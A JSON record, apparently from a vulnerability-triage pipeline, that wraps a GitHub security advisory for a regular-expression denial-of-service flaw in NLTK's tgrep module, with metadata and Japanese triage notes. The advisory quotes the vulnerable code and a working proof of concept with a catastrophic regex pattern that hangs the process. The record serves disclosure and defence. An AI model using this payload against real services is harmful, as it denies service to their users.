@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/230860773?v=4\", \"events_url\": \"https://api.github.com/users/infycore/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/infycore/followers\", \"following_url\": \"https://api.github.com/users/infycore/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/infycore/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/infycore\", \"id\": 230860773, \"login\": \"infycore\", \"node_id\": \"U_kgDODcKn5Q\", \"organizations_url\": \"https://api.github.com/users/infycore/orgs\", \"received_events_url\": \"https://api.github.com/users/infycore/received_events\", \"repos_url\": \"https://api.github.com/users/infycore/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/infycore/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/infycore/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/infycore\", \"user_view_type\": \"public\"}}, {\"type\": \"analyst\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/4782556?v=4\", \"events_url\": \"https://api.github.com/users/ekaf/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/ekaf/followers\", \"following_url\": \"https://api.github.com/users/ekaf/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/ekaf/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/ekaf\", \"id\": 4782556, \"login\": \"ekaf\", \"node_id\": \"MDQ6VXNlcjQ3ODI1NTY=\", \"organizations_url\": \"https://api.github.com/users/ekaf/orgs\", \"received_events_url\": \"https://api.github.com/users/ekaf/received_events\", \"repos_url\": \"https://api.github.com/users/ekaf/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/ekaf/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/ekaf/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/ekaf\", \"user_view_type\": \"public\"}}, {\"type\": \"tool\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/230979688?v=4\", \"events_url\": \"https://api.github.com/users/agent-kira/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/agent-kira/followers\", \"following_url\": \"https://api.github.com/users/agent-kira/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/agent-kira/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/agent-kira\", \"id\": 230979688, \"login\": \"agent-kira\", \"node_id\": \"U_kgDODcR4aA\", \"organizations_url\": \"https://api.github.com/users/agent-kira/orgs\", \"received_events_url\": \"https://api.github.com/users/agent-kira/received_events\", \"repos_url\": \"https://api.github.com/users/agent-kira/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/agent-kira/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/agent-kira/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/agent-kira\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-80206\", \"cvss\": {\"score\": null, \"vector_string\": null}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 0.0, \"vector_string\": null}, \"cvss_v4\": {\"score\": 8.2, \"vector_string\": \"CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-1333\", \"name\": \"Inefficient Regular Expression Complexity\"}], \"description\": \"### Summary\\nThe NLTK `tgrep` module accepts user-supplied regular expressions and passes them to the Python `re` engine without a timeout or validation, enabling catastrophic backtracking (ReDoS). Applications that expose the `tgrep` API to external input are vulnerable to a single-request denial of service that blocks the Python process indefinitely.\\n\\n### Affected Code\\n`nltk/tgrep.py` — `_tgrep_node_action()` (around line 320)\\n\\nWhen a tgrep pattern contains a `/regex/` node, `_tgrep_node_action` compiles the embedded regex literal directly with no validation:\\n\\n```python\\ndef _tgrep_node_action(_s, _l, tokens):\\n    ...\\n    elif tokens[0].startswith(\\\"/\\\"):\\n        assert tokens[0].endswith(\\\"/\\\")\\n        node_lit = tokens[0][1:-1]\\n        return (\\n            lambda r: lambda n, m=None, l=None: r.search(\\n                _tgrep_node_literal_value(n)\\n            )\\n        )(re.compile(node_lit))  # User regex compiled and executed with no timeout\\n```\\nThe compiled regex is applied against every matching tree node label via `r.search(...)`. A caller reaching this path via `tgrep_positions()` or `tgrep_compile()` controls `node_lit` entirely.\\n\\n### Proof of Concept\\n```python\\nimport nltk\\nfrom nltk.tgrep import tgrep_positions\\n\\n# Root node label is 25 'a' characters.\\n# tgrep /regex/ branch calls re.compile(\\\"((a+)+)b\\\").search(\\\"aaa...a\\\")\\n# No 'b' is present — exponential backtracking occurs.\\ntree = nltk.Tree.fromstring(\\\"(\\\" + \\\"a\\\" * 25 + \\\" (NP (DT the)))\\\")\\ntgrep_positions(r\\\"/((a+)+)b/\\\", [tree])   # Never returns\\n```\\n\\n### Working Poc\\n\\nThe following script uses increasing values of n (the number of repeated as in the tree root label) to measure the execution time of tgrep_positions with the catastrophic regex /((a+)+)b/. On standard CPython with NLTK 3.10.2, the runtime grows exponentially, confirming the ReDoS vulnerability. For n ≥ 35, the function will hang indefinitely.\\n\\n```python\\nimport nltk\\nfrom nltk.tgrep import tgrep_positions\\nimport time\\n\\ndef test_n(n):\\n    tree = nltk.Tree.fromstring(\\\"(\\\" + \\\"a\\\" * n + \\\" (NP (DT the)))\\\")\\n    pattern = r\\\"/((a+)+)b/\\\"\\n    start = time.perf_counter()\\n    list(tgrep_positions(pattern, [tree]))\\n    return time.perf_counter() - start\\n\\nif __name__ == \\\"__main__\\\":\\n    # Adjust the range if needed – these values complete quickly\\n    n_values = [18, 20, 22, 24, 26, 28]\\n    print(f\\\"Testing n = {n_values}\\\\n\\\")\\n\\n    times = []\\n    for n in n_values:\\n        t = test_n(n)\\n        times.append((n, t))\\n        print(f\\\"n={n:2d} done\\\", flush=True)\\n\\n    print(\\\"\\\\n--- Increase factors (per step in n) ---\\\")\\n    factors = []\\n    for i in range(1, len(times)):\\n        prev_n, prev_t = times[i-1]\\n        curr_n, curr_t = times[i]\\n        factor = curr_t / prev_t\\n        factors.append((curr_n, factor))\\n        print(f\\\"n={curr_n:2d} : factor = {factor:.2f}x  (vs n={prev_n})\\\")\\n\\n    avg = sum(f for _, f in factors) / len(factors)\\n    print(f\\\"\\\\nAverage factor: {avg:.2f}x\\\")\\n    print(\\\"\\\\n✅ Confirmed: exponential growth (catastrophic backtracking).\\\")\\n    print(\\\"   Larger n (≥ 35) will hang indefinitely.\\\")\\n```\\n\\nWhen run, the output shows a clear exponential increase (factor > 3.0 per +2 in n), proving the vulnerability.\\n\\n\\n### Impact\\nIn environments like web APIs (Flask, FastAPI), Jupyter notebooks, or multi-tenant pipelines, an unauthenticated attacker can cause indefinite CPU saturation with a single crafted request, denying service to all other users of the process.\\n\\n### Remediation\\nThis issue remains unfixed in versions `<= 3.10.2`. Maintainers are currently collaborating on a patch to wrap the regex execution in a timeout-guarded mechanism.\\n\\n### Credit\\nTool: Kira by [Offgrid Security](https://www.offgridsec.com)\", \"epss\": {\"percentage\": 0.00264, \"percentile\": 0.18022}, \"ghsa_id\": \"GHSA-w3v8-gmh9-3wv7\", \"github_reviewed_at\": \"2026-09-08T20:28:28Z\", \"html_url\": \"https://github.com/advisories/GHSA-w3v8-gmh9-3wv7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-w3v8-gmh9-3wv7\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-80206\"}], \"nvd_published_at\": null, \"published_at\": \"2026-09-08T20:28:28Z\", \"references\": [\"https://github.com/nltk/nltk/security/advisories/GHSA-w3v8-gmh9-3wv7\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-80206\", \"https://github.com/nltk/nltk/commit/0072ea2fb8be22e038a36e887b7061bb6b9339d9\", \"https://github.com/nltk/nltk/releases/tag/v3.10.3\", \"https://github.com/pypa/advisory-database/tree/main/vulns/nltk/PYSEC-2026-3751.yaml\", \"https://www.vulncheck.com/advisories/nltk-3.10.2-regular-expression-denial-of-service-via-tgrep\", \"https://github.com/advisories/GHSA-w3v8-gmh9-3wv7\"], \"repository_advisory_url\": \"https://api.github.com/repos/nltk/nltk/security-advisories/GHSA-w3v8-gmh9-3wv7\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/nltk/nltk\", \"summary\": \"NLTK: ReDoS in nltk.tgrep via unvalidated user-supplied regular expressions\", \"type\": \"reviewed\", \"updated_at\": \"2026-09-08T20:28:30Z\", \"url\": \"https://api.github.com/advisories/GHSA-w3v8-gmh9-3wv7\", \"vulnerabilities\": [{\"first_patched_version\": \"3.10.3\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"nltk\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.10.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-w3v8-gmh9-3wv7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "kev_entries": {},
+    "kev_ransomware": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "nltk: <= 3.10.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-80206"
+    ],
+    "cvss_score": 8.2,
+    "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "nltk"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-09-09T19:13:26.262590Z",
+  "provenance": {
+    "content_sha256": "ef57dd66fed08fedda351b46b44af238de457a47d65b3250c1715c873449d030",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-09-08T20:28:28Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-w3v8-gmh9-3wv7",
+  "status": "active",
+  "title": "NLTK: ReDoS in nltk.tgrep via unvalidated user-supplied regular expressions",
+  "updated_at": "2026-09-08T20:28:30Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-w3v8-gmh9-3wv7"
+}
